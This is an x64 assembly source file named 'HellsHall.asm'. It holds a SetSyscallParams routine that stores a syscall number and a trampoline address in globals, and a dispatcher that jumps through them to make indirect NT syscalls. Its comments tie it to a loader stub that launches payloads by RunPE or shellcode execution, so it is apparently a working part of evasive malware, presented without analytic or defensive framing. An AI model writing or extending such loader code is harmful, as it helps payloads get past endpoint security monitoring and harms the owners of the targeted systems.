; ==========================================================================
;  HellsHall.asm – Assembly wrapper for Indirect Syscalls via globals (SetSyscallParams pattern)
; ==========================================================================

.code

PUBLIC HellsHallSyscall

.code
.data
    g_SSN        DWORD 0
    g_Trampoline QWORD 0

.code

; SetSyscallParams — stores SSN and trampoline address into module-level globals.
;
; NOT thread-safe: g_SSN and g_Trampoline are shared globals with no locking.
; SetSyscallParams + HellsHallSyscall must execute atomically on a single thread.
; The loader (Stub.cpp EntryPoint) is single-threaded throughout; after the payload
; is launched (RunPE / shellcode exec), HellsHall must not be called again from
; the loader thread — any payload threads must not share this dispatcher.
SetSyscallParams PROC
    mov [g_SSN], ecx           ; RCX = SSN
    mov [g_Trampoline], rdx    ; RDX = Trampoline
    ret
SetSyscallParams ENDP

HellsHallSyscall PROC
    mov eax, [g_SSN]
    mov r11, [g_Trampoline]
    mov r10, rcx               ; NT calling convention
    jmp r11
HellsHallSyscall ENDP


END
